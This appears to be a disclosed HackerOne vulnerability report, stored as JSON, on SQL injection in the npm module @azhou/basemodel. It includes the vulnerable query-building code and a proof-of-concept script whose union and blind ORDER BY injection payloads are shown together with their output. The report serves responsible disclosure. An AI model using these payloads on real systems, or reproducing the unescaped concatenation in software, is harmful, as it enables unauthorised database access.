@@ -1,0 +1,127 @@
+{
+  "id": 506644,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY2NDQ=",
+  "url": "https://hackerone.com/reports/506644",
+  "title": "[@azhou/basemodel] SQL injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-08T06:30:42.485Z",
+  "submitted_at": "2019-03-08T06:30:42.485Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "verichains",
+    "url": "/verichains",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-02-02T23:00:07.219Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-01-03T23:00:04.681Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report SQL injection in @azhou/basemodel\nIt allows attacker to read data from database.\n\n# Module\n\n**module name:** @azhou/basemodel\n**version:** 1.0.0\n**npm page:** `https://www.npmjs.com/package/@azhou/basemodel`\n\n## Module Description\n\n### Usage\n\n#### Initialization\n\n```js\nvar model = require(\"@azhou/basemodel\")(tableName, fields);\n```\nwhere `tableName` is the name of the data table and `fields` refers to the field list, either using comma connected string or array.\n\nExample:\n```js\n// Initialize database\nvar db = require(\"@azhou/mysql-wrapper\");\ndb.init(\"server\", \"database\", \"username\", \"password\");\n\n// Create basic CRUD data model\nvar model = require(\"@azhou/basemodel\")(\"table\", [ \"field1\", \"field2\", \"field3\", ... ]);\n```\n\nNotice when defining fields, `id` should not implicitly added and should not be contained in the field list\n\nIf validation is required, function `validate()` that returns boolean can be added to `model`:\n```js\nmodel.validate = function (source) { ... }\n```\n\n#### CRUD Functions\n\n##### Create Object\n\n```js\nmodel.create(source)\n```\n* `source` is the source object\n\nExample:\n```js\nmodel.create({ name: 'John Doe', value: 123.456 }).then(function (id) { ... });\n```\n\n##### Read Object by ID\n\n```js\nmodel.getById(id, fields)\n```\n* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\n\nExamples:\n```js\nmodel.getById(123).then(function (obj) { ... });\nmodel.getById(456, [ \"name\", \"value\" ]).then(function (obj) { ... });\n```\n\n##### Read Object by Name\n\n```js\nmodel.getByName(name, fields)\n```\n* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\n\n##### Read All Objects\n\n```js\nmodel.getAll(fields, orderby)\n```\n* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\n\n* `orderby` is an optional string argument which defines the ordering of the returned list.\n\nExamples:\n```js\nmodel.getAll(\"name\").then(function (list) { ... });\nmodel.getAll([ \"name\", \"value\" ]).then(function (list) { ... });\nmodel.getAll([ \"name\", \"value\" ], \"name DESC\").then(function (list) { ... });\n```\n\n##### Read Objects by ID list\n\nThere are four different of formats:\n\n1. Read all objects whose `id` is in the `ids` list:\n\n\t```js\n\tmodel.getAllByIds(ids)\n\t```\n\n2. Read all objects whose `id` is in the `ids` list, and returns the fields listed in `fields` array\n\t\n\t```js\n\tmodel.getAllByIds(ids, fields)\n\t```\n3. Object array is provided, and the `id` is retrieved from field `nameOfIdField`\n\n\t```js\n\tmodel.getAllByIds(objects, nameOfIdField)\n\t```\n4. Object array is provided, and the `id` is retrieved from field `nameOfIdField`. Field array is also provided\n\n\t```js\n\tmodel.getAllByIds(objects, nameOfIdField, fields)\n\t```\n\nExamples:\n```js\nmodel.getAllByIds([ 1, 2, 3 ]).then(function (list) { ... });\nmodel.getAllByIds([ 1, 2, 3 ], [ \"name\", \"value\" ]).then(function (list) { ... });\nmodel.getAllByIds(objects, \"id\").then(function (list) { ... });\nmodel.getAllByIds(objects, \"id\", [ \"name\", \"value\" ]).then(function (list) { ... });\n```\n\n##### Update Object\n```js\nmodel.update(id, source)\n```\nExample:\n```js\nmodel.update(123, { name: \"Mike Smith\" }).then(function () { ... });\n```\n\n##### Delete Object\n```js\nmodel.delete(id)\n```\n\n## Module Stats\n\n8 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n- All table names and fields arguments of all methods are fed directly into query by string concatenation without escaping which may lead to sql injection.\n- Order by field of `model.getAll(fields, orderby)` is not escaped and directly used in query which lead to blind sql injection:\n```js\n\tmodel.getAll = function (fields, orderby) {\n\t\tif (typeof fields == 'string') {\n\t\t\torderby = fields;\n\t\t\tfields = allFields;\n\t\t} else if (Array.isArray(fields) && (typeof orderby == 'string' || !orderby)) {\n\t\t\tif (fields.length == 0)\n\t\t\t\tfields = allFields;\n\t\t} else {\n\t\t\tfields = allFields;\n\t\t\torderby = \"\";\n\t\t}\n\n\t\treturn db.query(\"SELECT id,\" + fields.join(\",\") + \" FROM `\" + table + \"`\"\n\t\t\t+ (orderby ? \" ORDER BY \" + orderby : \"\"));\n\t}\n```\n\n## Steps To Reproduce:\n\nExample POC:\n```\nvar db = require(\"@azhou/mysql-wrapper\");\ndb.init(\"localhost\", \"mysql\", \"root\", \"\");\n\n(async () => {\n\tawait db.query(\"CREATE TABLE IF NOT EXISTS test(id int not null PRIMARY KEY AUTO_INCREMENT, ckey varchar(255), cvalue varchar(255));\");\n\tawait db.query(\"TRUNCATE TABLE test;\");\n\n\tvar model = require(\"@azhou/basemodel\")(\"test\", [\"ckey\",\"cvalue\"]);\n\t\n\tfor(var i=0;i<10;i++)\n\t\tawait model.create({ckey: `k${i}`, cvalue: `v${i}`});\n\t\n\tconsole.log('- get all (normal)');\n\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"]))\n\n\tconsole.log('- get all (sqli)');\n\tconsole.log(await model.getAll([\"ckey\", \"cvalue from test where 1=0 union all select 0, 'sqli','sqli'#\"]))\n\n\tconsole.log('- get all (bsqli in order by)');\n\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"], 'IF(1=1, id, -id) LIMIT 1'))\n\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"], 'IF(1=0, id, -id) LIMIT 1'))\n})()\n```\n\nOutput\n```\n- get all (normal)\n[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' },\n  RowDataPacket { id: 2, ckey: 'k1', cvalue: 'v1' },\n  RowDataPacket { id: 3, ckey: 'k2', cvalue: 'v2' },\n  RowDataPacket { id: 4, ckey: 'k3', cvalue: 'v3' },\n  RowDataPacket { id: 5, ckey: 'k4', cvalue: 'v4' },\n  RowDataPacket { id: 6, ckey: 'k5', cvalue: 'v5' },\n  RowDataPacket { id: 7, ckey: 'k6', cvalue: 'v6' },\n  RowDataPacket { id: 8, ckey: 'k7', cvalue: 'v7' },\n  RowDataPacket { id: 9, ckey: 'k8', cvalue: 'v8' },\n  RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]\n- get all (sqli)\n[ RowDataPacket { id: 0, ckey: 'sqli', cvalue: 'sqli' } ]\n- get all (bsqli in order by)\n[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' } ]\n[ RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]\n```\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- MacOS\n- 8.12.0\n- 6.4.1\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAllow attackers to query database if they have access to orderBy variable and to perform any query type if have access to table or column variable.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-02-02T23:00:04.851Z",
+  "allow_singular_disclosure_after": -197655611.71605155,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "mthakur09",
+    "v13rsba"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
